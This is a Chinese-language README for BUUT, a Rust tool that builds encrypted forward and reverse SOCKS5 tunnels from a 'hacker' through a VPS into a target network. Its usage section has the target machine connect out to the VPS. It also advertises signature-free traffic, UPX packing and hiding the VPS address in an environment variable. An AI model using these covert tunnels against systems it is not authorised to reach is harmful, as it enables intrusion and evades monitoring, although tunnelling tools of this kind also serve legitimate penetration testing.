# BUUT 

## 介绍 
一款使用rust开发的高性能正反向代理隧道工具，基于yamux多路复用技术。

## 工作原理
```rust
+------+      +-------------+      +-----------+      +-------------+      +----------+      +------+
|hacker| <--> | Socks5 VPS  | <--> |Yamux frame| <--> |Noise stream | <--> |TCP stream| <--> |TARGET|
+------+      +-------------+      +-----------+      +-------------+      +----------+      +------+
```

## 参数介绍 
```rust
    opts.optopt("l", "server_listen",   "", "服务监听地址,默认0.0.0.0:443");
    opts.optopt("s", "remote_addr",     "", "远程地址,默认127.0.0.1:443");
    opts.optopt("p", "proxy_port",      "", "代理端口,默认10086");
    opts.optopt("m", "transport",       "", "协议类型,默认TCP");//|KCP|WS|ICMP|DNS
    opts.optopt("k", "key",             "", "加密密钥");
    opts.optopt("n", "channel",         "", "通道数量,默认1");
    opts.optopt("c", "config",          "", "配置文件路径");
    opts.optopt("",  "sockspass",       "", "代理密码,默认不验证,用户名buut"); 
    opts.optflagopt("F", "forward",     "", "是否正向模式");
    opts.optflagopt("S", "server",      "", "是否服务模式");
```

## 特点：

速度快，使用多路复用技术 将带宽利用到极致。rust开发，速度、稳定性和安全性都有保证。

体积小，编译只有不到几百k, 使用upx后还能更小,相比golang写的程序动辄10多M还是很有优势的。

无特征，程序使用Noise定制加密，可使用动态密钥保证无任何特征。

单文件，客户端和服务端使用同样的单文件、多模式自由组合切换。

多协议，目前release 0.4已支持tcp、kcp、websocket，后续把icmp、dns协议支持加进去。
	


## 使用方法 

### 正向隧道：

```bash
	target执行：./buut -F -l 443 
	vps执行 ：./buut -F -S -s target:443 -p 10086
  	hacker连接socks5  vps:10086 
```

### 反向隧道

```bash
	vps执行：./buut -S -l 443 -p 10086
	target执行：./buut -s vps:443
   	hacker连接socks5  vps:10086 
```

### Tips

1、正向隧道时只能使用单通道的tcp或者websocket协议。

2、设置BUUT变量隐藏vps。 如： 原本的 ./buut -s vps:1234 可改成 export BUUT=vps:1234 && ./buut 

3、使用websocket协议时,连接地址应设为ws://xxx格式 如: ./buut -m ws -s ws://target:8081/service

4、使用kcp协议时,数据不会加密只会压缩。


## 更新 

### 0.4

1、加入websocket, kcp 协议支持。

2、修复client端不会自动重连的bug。

3、优化参数配置。

### 0.3.1 

1、加入windows支持。

2、修改默认参数。

3、优化体积。


## todo

1、增加icmp、dns协议支持  

2、增加自动设置端口复用模式参数

3、加入多级代理支持

4、优化参数体验
	
